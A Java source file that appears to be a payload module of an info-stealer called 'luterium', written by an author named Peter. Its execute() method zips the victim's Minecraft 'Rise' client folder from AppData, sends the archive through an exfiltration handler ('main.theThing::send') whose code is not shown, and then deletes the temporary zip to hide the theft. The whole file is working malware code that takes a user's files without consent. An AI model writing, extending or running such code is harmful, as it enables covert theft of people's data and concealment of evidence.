package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.util.Optional;

/**
 * @author Peter
 * @since 10/09/2022
 * Back to the project and now into mc 1.8 cheating >:).
 */

public class RiseConfigs implements PayloadExecutor {
    Main main = new Main();

    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\Rise";
    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofRise.zip";

    @Override
    public void execute() throws Exception {
        ZipUtil.pack(new File(path), new File(zipPath));

        Optional<File> file = FileUtil.getFile(zipPath);
        file.ifPresent(main.theThing::send);

        deleteFileAfterSent();
    }

    public void deleteFileAfterSent() {
        File zipFile = new File(zipPath);

        zipFile.delete();
    }
}
